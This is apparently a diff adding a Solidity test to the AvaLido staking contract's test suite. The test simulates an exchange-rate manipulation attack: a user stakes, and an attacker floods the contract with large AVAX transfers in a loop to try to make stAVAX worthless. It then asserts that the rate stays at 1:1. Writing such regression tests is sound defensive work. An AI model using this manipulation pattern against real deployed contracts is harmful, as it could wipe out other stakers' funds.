@@ -1560,4 +1560,26 @@ contract AvaLidoTest is DSTest, Helpers {
         cheats.prank(USER1_ADDRESS);
         lido.deposit{value: 1.1 ether}();
     }
+
+    function testExploitZeroValueStAVAX() public {
+        // Let a user stake 1 avax and get stAVAX
+        cheats.deal(USER1_ADDRESS, 1 ether);
+        cheats.prank(USER1_ADDRESS);
+        lido.deposit{value: 1 ether}();
+
+        // Attacker now creates 1 stAVAX
+        cheats.deal(USER1_ADDRESS, MAXIMUM_STAKE_AMOUNT);
+        cheats.prank(USER1_ADDRESS);
+        lido.deposit{value: 1 ether}();
+
+        // rate is 1:1 still
+        assertEq(lido.exchangeRateAVAXToStAVAX(), 1 ether);
+
+        // Then attacker forces stAVAX value to zero
+        cheats.prank(USER1_ADDRESS);
+        for (uint256 index = 0; index < 500; index++) {
+            payable(address(lido)).transfer(100000000 ether);
+        }
+        assertEq(lido.exchangeRateAVAXToStAVAX(), 1 ether);
+    }
 }
